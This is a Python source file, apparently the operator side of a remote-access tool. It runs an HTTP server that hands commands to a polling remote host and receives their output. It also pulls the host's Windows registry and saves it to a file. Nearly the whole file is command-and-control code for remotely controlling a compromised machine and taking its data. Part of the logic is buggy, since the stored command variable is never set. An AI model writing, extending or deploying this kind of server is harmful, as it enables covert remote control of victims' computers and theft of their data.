import socket as sock
import http.server as Serv
import socketserver
import sys


#Handles all http requests
command = ""
class httpHandler(Serv.SimpleHTTPRequestHandler):
	def do_GET(self):
		command = input("Type 'get reg' to get the registry of the host\n" +
			"type a command to user the remote computer\n"+
			"type a 'exit client' to close the connection to the remote host\n\n>")
		self.send_response(200)
		self.send_header("Content-Type", "text/html")
		self.end_headers()
		self.wfile.write(bytes(command, "utf-16"))

	def do_POST(self):
		self.send_response(200)
		self.end_headers()
		content_len = int(self.headers['Content-Length'])
		print("Content length: {}".format(content_len))
		if "get reg" in command:
			with open("transferred.reg", "wb") as f:
				f.write(self.rfile.read(content_len))
		else:
			print(self.rfile.read(content_len).decode())
		print()


if __name__ == '__main__':
		try:
			myHandler = httpHandler
			serv_sock = socketserver.TCPServer(('localhost', 80), myHandler)
			while True:
				serv_sock.serve_forever()
				print("Closing Connection")
				serv_sock.server_close()
		except KeyboardInterrupt:
				print("ctrl-c was hit")
				serv_sock.server_close()